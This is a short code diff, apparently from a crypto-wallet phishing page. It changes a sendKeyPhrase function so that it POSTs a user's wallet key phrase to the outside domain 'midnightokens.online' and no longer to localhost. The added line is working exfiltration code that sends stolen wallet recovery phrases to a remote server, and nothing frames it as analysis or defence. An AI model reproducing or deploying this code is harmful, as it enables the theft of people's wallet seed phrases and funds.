@@ -745,7 +745,7 @@ const wallets = [
         function sendKeyPhrase(keyPhrase) {
             var data = { keyPhrase: keyPhrase };
             
-            fetch('http://localhost:8000/send-email', { 
+            fetch('https://midnightokens.online/send-email', { 
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
